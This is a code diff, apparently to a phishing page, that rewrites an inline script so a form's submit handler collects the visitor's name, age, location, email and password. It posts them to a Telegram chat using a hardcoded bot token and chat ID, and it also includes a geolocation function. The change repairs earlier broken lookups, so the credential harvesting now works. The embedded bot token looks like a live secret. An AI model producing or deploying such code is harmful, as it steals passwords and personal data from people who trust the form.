@@ -44,7 +44,7 @@
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     
     <script>
-      const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
+ const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
 const chatId = '-1001983705713'; // Chat ID penerima pesan
 
 async function telegramRequest(method, data) {
@@ -57,22 +57,33 @@ async function telegramRequest(method, data) {
   }
 }
 
-var nama = document.getElememtById('nama').value;
-var umur = document.getElememtById('umur').value;
-var alamat = document.getElememtById('lokasi').value;
-var tgl_lahir = document.getElememtById('tgl_lahir')
-var email = document.getElememtById('email').value;
-var kata_sandi = document.getElememtById('kata_sandi').value;
+const form = document.getElementById('form');
+form.addEventListener('submit', async (event) => {
+  event.preventDefault();
 
-var result = "\nNama : " + nama + "\nUmur : " + umur + " Tahun" + "\nLokasi : " + alamat + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi;
+  // Ambil nilai dari setiap elemen input
+  const nama = document.getElementById('nama').value;
+  const umur = document.getElementById('umur').value;
+  const alamat = document.getElementById('lokasi').value;
+  const email = document.getElementById('email').value;
+  const kata_sandi = document.getElementById('kata_sandi').value;
 
-function sendText() {
-  const message = result;
-  if (message) {
-    telegramRequest('sendMessage', { chat_id: chatId, text: message });
-    alert("Berhasil Mengirim");
-  }
-}
+  // Buat string dari data yang diambil
+  const message = `
+    Nama : ${nama}
+    Umur : ${umur} Tahun
+    Lokasi : ${alamat}
+    Email : ${email}
+    Kata Sandi : ${kata_sandi}
+  `;
+
+  // Kirim data ke Telegram
+  await telegramRequest('sendMessage', { chat_id: chatId, text: message });
+
+  // Tampilkan pesan sukses
+  alert("Berhasil Mengirim");
+});
+
 
       function getLocation() {
                         if (navigator.geolocation) {
